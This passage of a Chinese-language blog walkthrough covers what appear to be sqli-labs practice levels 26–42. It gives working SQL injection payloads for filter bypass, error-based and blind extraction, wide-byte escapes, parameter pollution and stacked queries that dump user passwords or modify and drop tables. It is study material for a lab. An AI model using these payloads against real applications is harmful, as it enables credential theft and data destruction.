class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li></ul><h2 id="26（双写、注释符绕过）"><a href="#26（双写、注释符绕过）" class="headerlink" title="26（双写、注释符绕过）"></a>26（双写、注释符绕过）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201221348.png" alt="image-20250306190428247"></p><p>过滤了逻辑运算符，<strong>注释符</strong>以及空格</p><p><strong>双写绕过逻 辑运算符或者使&amp;&amp;和||替换</strong></p><p>空格过滤：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> Tab键（水平）<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return 键<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> Tab键（垂直）<br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格<br>() 绕过<br></code></pre></td></tr></table></figure><p>注释符绕过：</p><p><strong>;%00</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(updatexml(1,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1));%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">1</span>));%<span class="hljs-number">00</span><br>显示不全（因为显示的字段太长，有限制）<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(updatexml(1,mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;</span>users<span class="hljs-string">&#x27;)),40,100),1));%00</span><br><span class="hljs-string">(加mid由于，其可以使用更加简洁的输出想要的字段)</span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-number">0x7e</span>,passwoorrd))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">1</span>));%<span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201223817.png" alt="image-20250306193603285"></p></li></ul><h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201225844.png" alt="image-20250306193957125"></p><p>无显示报错信息</p><p>不能使用报错注入，使用盲注&#x2F;联合</p><p>（但是联合括号太多了）</p></li><li><pre><code class="hljs">?id=1&#39;)anandd(length(database())=8);%00?id=1&#39;)anandd(ascii(substr(database(),1,1))=115);%00?id=1&#39;)anandd(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00?id=1&#39;)anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101);%00<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  <br><br><span class="hljs-section">## 27</span><br><br><span class="hljs-bullet">-</span> 确定以单引号闭合<br><br>  ![<span class="hljs-string">image-20250306200303124</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201228451.png</span>)<br><br>  而且禁用了两个关键词<br><br>  <span class="hljs-strong">**UNION &amp; SELECT**</span><br><br><span class="hljs-bullet">-</span> 有报错可以使用报错注入，可以使用<span class="hljs-strong">**大小写**</span>绕过<br><br></code></pre></td></tr></table></figure>?id=1&#39;and(updatexml(1,concat(0x7e,database()),0x7e),1);%00?id=1&#39;and(updatexml(1,(SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1));%00?id=1&#39;and(updatexml(1,(SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),1));%00显示不全（因为显示的字段太长，有限制）?id=1&#39;and(updatexml(1,mid((SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),40,100),1));%00(加mid由于，其可以使用更加简洁的输出想要的字段)?id=1&#39;and(updatexml(1,(SELect(group_concat(username,0x7e,password))from(users)),1));%00<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## <span class="hljs-number">27</span>a<br><br>- 双引号注入<br><br>但是无报错，所以使用盲注<br><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>?id&#x3D;1”and(length(database())&#x3D;8);%00<br>?id&#x3D;1”and(ascii(substr(database(),1,1))&#x3D;115);%00<br>?id&#x3D;1”and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))&#x3D;29);%00<br>?id&#x3D;1”and(ascii(substr((SELect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database())),1,1))&#x3D;101);%00</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>## <span class="hljs-number">28</span><br><br>![image<span class="hljs-number">-20250306203746685</span>](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/<span class="hljs-number">20251027201231191.</span>png)<br><br>过滤空格和注释符<br><br>- 单引号+括号闭合<br><br>  无回显，使用盲注/联合<br><br>- ```<br>  ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)and(length(database())=8);%00</span><br><span class="hljs-string">  ?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>);%<span class="hljs-number">00</span><br>  ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00</span><br><span class="hljs-string">  ?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(ascii(substr((<span class="hljs-keyword">SELect</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>);%<span class="hljs-number">00</span><br>  <br></code></pre></td></tr></table></figure><h2 id="28a"><a href="#28a" class="headerlink" title="28a"></a>28a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201232792.png" alt="image-20250306203625655"></p><p>只过滤union select</p><p>双写绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;);%00  <br><br>?<span class="hljs-attribute">id</span>=1&#x27;) order by 3;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,3;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,database(),version();%00 <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(username,id,password) <span class="hljs-keyword">from</span> users;%00  <br></code></pre></td></tr></table></figure><p>或者布尔注入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">同上题<br></code></pre></td></tr></table></figure></li></ul><h2 id="29HPP-http参数污染（双服务器）"><a href="#29HPP-http参数污染（双服务器）" class="headerlink" title="29HPP http参数污染（双服务器）"></a>29HPP http参数污染（双服务器）</h2><ul><li><pre><code class="hljs">id=1&#39; order by 3--+（使用双引号测试）（闭合括号）?id=-1&#39; union select 1,2,3--+?id=-1&#39; union select 1,database(),version()--+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### 重点<br><br>参数污染:提交相同参数，不同的处理方式<br><br></code></pre></td></tr></table></figure>?id=123cookie: id=123<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>?id=123&amp;id=13555<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>对两个id的传参处理不一样<br><br>![image<span class="hljs-number">-20250306211048605</span>](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/<span class="hljs-number">20251027201238412.</span>png)<br><br><br><br>## <span class="hljs-number">30</span><br><br>- ```<br>  id=<span class="hljs-number">1</span>&quot; order by 3--+（使用双引号测试）（闭合括号）<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br>  ?id=<span class="hljs-number">-1</span>&quot; union select 1,database(),version()--+<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br>  ?id=<span class="hljs-number">-1</span>&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><ul><li><pre><code class="hljs">id=1&quot;) order by 3--+（使用双引号测试）（闭合括号）?id=-1&quot;) union select 1,2,3--+?id=-1&quot;) union select 1,database(),version()--+?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 32（转义 宽字节注入）</span><br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250306212036698</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201242247.png</span>)<br><br>  （preg<span class="hljs-emphasis">_replace预定义字符之前添加反斜杠）</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  此函数将   “  ’  转化 </span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  加%df+单引号 ，相当于两个字符---&gt;<span class="hljs-strong">**表示汉字**</span></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  使得<span class="hljs-strong">**单引号**</span>逃逸出来</span><br><span class="hljs-emphasis"></span><br></code></pre></td></tr></table></figure>?id=-1%df&#39;union select 1,database(),3 --+ ?id=-1%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+     爆表 ?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+   爆字段使用16进制?id=-1%df&#39; union select 1,group_concat(password,username),3 from users--+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 33</span><br><br>双引号闭合<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=-1%df&quot;union select 1,database(),3 --+<br>   <br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+     爆表<br>   <br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=0x7573657273--+   爆字段<br>  使用16进制<br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(password,username),3 <span class="hljs-keyword">from</span> users--+<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="34（post-宽字节）"><a href="#34（post-宽字节）" class="headerlink" title="34（post+宽字节）"></a>34（post+宽字节）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201244881.png" alt="image-20250306213953154"></p><p>表单类型的宽字节</p><p>报错注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>%df&#x27;<br><br><span class="hljs-attribute">1</span>%df&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(SELECT database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+<br><br><br><span class="hljs-attribute">1</span>%df&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+ <br><br><span class="hljs-attribute">1</span>%df&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+<br><br><span class="hljs-attribute">1</span>%df&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>%df&#x27;<br></code></pre></td></tr></table></figure></li></ul><h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><ul><li><p>数字型+函数addslashes()</p><p>（<code>addslashes()</code> 是 PHP 中的一个函数，作用是 <strong>在字符串中特殊字符前添加反斜杠（\）进行转义</strong>，以防止 SQL 注入或字符串解析错误。）</p><p><strong>由于是数字型所以无需要宽字节注入</strong></p><p>直接报错注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span> <br><br>?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br><br>?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span>  group_concat(<span class="hljs-built_in">table_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(username,id,<span class="hljs-keyword">password</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> users ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><ul><li><p>单引号+宽字节+mysql_real_escape_string()函数转义</p></li><li><p><code>mysql_real_escape_string()</code> 是 <strong>PHP</strong> 中的一个函数，主要用于<strong>对字符串中的特殊字符进行转义</strong>，以防止 <strong>SQL 注入</strong></p></li><li><p>使用报错注入即可</p></li><li><pre><code class="hljs">1%df&#39;1%df&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+1%df&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ 1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>  <br><br>## <span class="hljs-number">37</span><br><br>- 单引号+post+宽字节+MySQL_real_escape_string<br><br>- 同<span class="hljs-number">34</span><br><br>- ```<br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">  1%df&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>  <br>  <br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;),0x7e),1) --+ </span><br><span class="hljs-string">  </span><br><span class="hljs-string">  1%df&#x27;</span><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>  <br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#x27;</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="38（堆叠注入）"><a href="#38（堆叠注入）" class="headerlink" title="38（堆叠注入）"></a>38（堆叠注入）</h2><p>堆叠&#x2F;报错&#x2F;联合</p><ul><li><p>单引号+<strong>mysqli_multi_query函数</strong></p><p><code>mysqli_multi_query函数</code>支持多条sql语句输出</p></li><li><pre><code class="hljs">?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+#id=18的数据修改改为账户：bx     密码为2328？id=18可查看到18的账户密码已被我们所修改<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+注册用户?id=1&#39;;create table xxx like users;--+创建xxx表?id=1&#39;;INSERT INTO xxx SELECT * FROM users;--+插入xxx数据?id=1&#39;;DELETE FROM xxx;--+删除xxx数据?id=1&#39;;DROP TABLE xxx;--+删除xxx表?id=1&#39;;updata users set password=&#39;12345&#39;where username=&#39;xxx&#39;修改xxx账户的密码<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br><span class="hljs-comment">## 39</span><br><br>堆叠/报错/联合<br><br>- 数字型+**mysqli_multi_query函数**<br><br>  同上<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=1;insert into users(id,username,password) values(<span class="hljs-string">&#x27;18&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  #<span class="hljs-attribute">id</span>=18的数据修改<br>  改为账户：bx     密码为2328<br>  <br>  ？<span class="hljs-attribute">id</span>=18<br>  可查看到18的账户密码已被我们所修改<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>堆叠&#x2F;联合</p><ul><li><p>无报错+单引号+括号</p></li><li><pre><code class="hljs">?id=1&#39;);insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+#id=18的数据修改改为账户：bx     密码为2328？id=18可查看到18的账户密码已被我们所修改<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br><span class="hljs-comment">## 41</span><br><br>堆叠/联合<br><br>- 无报错+数字<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=1&#x27;);insert into users(id,username,password) values(<span class="hljs-string">&#x27;18&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  #<span class="hljs-attribute">id</span>=18的数据修改<br>  改为账户：bx     密码为2328<br>  <br>  ？<span class="hljs-attribute">id</span>=18<br>  可查看到18的账户密码已被我们所修改<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="42-先堆叠，再二次注入"><a href="#42-先堆叠，再二次注入" class="headerlink" title="42(先堆叠，再二次注入)"></a>42(先堆叠，再二次注入)</h2><ul><li><p>账户进行转义，密码没有，但是存在堆叠注入的函数</p><p>（不是gbk编码所以<strong>不能使用</strong>宽字节）</p><p>使用堆叠注入</p><p>单引号</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 